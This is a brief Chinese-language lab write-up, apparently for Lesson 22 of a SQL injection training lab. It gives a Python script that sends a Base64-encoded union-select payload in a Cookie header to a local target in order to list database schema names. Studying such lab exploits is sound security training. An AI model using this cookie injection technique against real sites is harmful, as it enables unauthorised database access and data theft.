# Lesson-22
```
Base64编码-,-明注Cookie注入)
```

同样只是稍微修改了SQL语句 , 双引号 , 没有括号
```
import requests
import base64

url = "http://127.0.0.1/Less-22/"

postDate = {
	'uname':'admin',
	'passwd':'admin' 
}

headers = {
	'Host':'127.0.0.1',
	'User-Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0',
	'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
	'Accept-Language':'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
	'Accept-Encoding':'gzip, deflate',
	'Referer':'http://127.0.0.1/Less-20/index.php',
	'Cookie':"uname="+base64.b64encode("\" union select 1,group_concat(schema_name),3 from information_schema.schemata-- "),
	'Connection':'keep-alive',
	'Upgrade-Insecure-Requests':'1',
	'Cache-Control':'max-age=0'
}

content = (requests.post(url, data=postDate, headers=headers).text)
print(content)
```
